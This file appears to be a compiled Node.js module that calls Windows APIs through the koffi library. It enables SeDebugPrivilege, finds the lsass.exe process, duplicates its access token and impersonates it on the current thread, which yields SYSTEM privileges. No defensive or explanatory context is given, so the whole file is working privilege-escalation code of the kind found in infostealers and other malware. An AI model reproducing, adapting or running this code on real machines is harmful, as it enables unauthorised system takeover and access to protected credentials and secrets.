Object.defineProperty(exports, "__esModule", {
  value: true
});
const koffi = require("koffi");
const WinApi = require("./WinApi.js");
function enablePrivilege(name) {
  const processHandle = WinApi.GetCurrentProcess();
  const tokenBuffer = Buffer.alloc(8);
  if (!WinApi.OpenProcessToken(processHandle, 40, tokenBuffer)) return false;
  const token = koffi.decode(tokenBuffer, WinApi.HANDLE);
  const luidBuffer = Buffer.alloc(koffi.sizeof(WinApi.LUID));
  if (!WinApi.LookupPrivilegeValueA(null, name, luidBuffer)) {
    WinApi.CloseHandle(token);
    return false;
  }
  const result = WinApi.AdjustTokenPrivileges(token, 0, {
    PrivilegeCount: 1,
    Privileges: [{
      Luid: koffi.decode(luidBuffer, WinApi.LUID),
      Attributes: 2
    }]
  }, 0, null, null);
  WinApi.CloseHandle(token);
  return !!result && WinApi.GetLastError() !== 1300;
}
function getLsassPid() {
  const snapshot = WinApi.CreateToolhelp32Snapshot(2, 0);
  if (!snapshot) return null;
  const entryBuffer = Buffer.alloc(koffi.sizeof(WinApi.PROCESSENTRY32));
  entryBuffer.writeUInt32LE(koffi.sizeof(WinApi.PROCESSENTRY32), 0);
  let pid = null;
  if (WinApi.Process32First(snapshot, entryBuffer)) {
    do {
      const entry = koffi.decode(entryBuffer, WinApi.PROCESSENTRY32);
      if (Buffer.from(entry.szExeFile).toString().split("\0")[0].toLowerCase() === "lsass.exe") {
        pid = entry.th32ProcessID;
        break;
      }
    } while (WinApi.Process32Next(snapshot, entryBuffer));
  }
  WinApi.CloseHandle(snapshot);
  return pid;
}
function impersonateLsass() {
  if (!enablePrivilege("SeDebugPrivilege")) return false;
  const pid = getLsassPid();
  if (!pid) return false;
  const processHandle = WinApi.OpenProcess(4096, 0, pid);
  if (!processHandle) return false;
  const tokenBuffer = Buffer.alloc(8);
  if (!WinApi.OpenProcessToken(processHandle, 10, tokenBuffer)) {
    WinApi.CloseHandle(processHandle);
    return false;
  }
  const token = koffi.decode(tokenBuffer, WinApi.HANDLE);
  const duplicateBuffer = Buffer.alloc(8);
  if (!WinApi.DuplicateTokenEx(token, 33554432, null, 2, 2, duplicateBuffer)) {
    WinApi.CloseHandle(token);
    WinApi.CloseHandle(processHandle);
    return false;
  }
  const duplicate = koffi.decode(duplicateBuffer, WinApi.HANDLE);
  const result = WinApi.SetThreadToken(null, duplicate);
  WinApi.CloseHandle(duplicate);
  WinApi.CloseHandle(token);
  WinApi.CloseHandle(processHandle);
  return !!result;
}
exports.enablePrivilege = enablePrivilege;
exports.getLsassPid = getLsassPid;
exports.impersonateLsass = impersonateLsass;
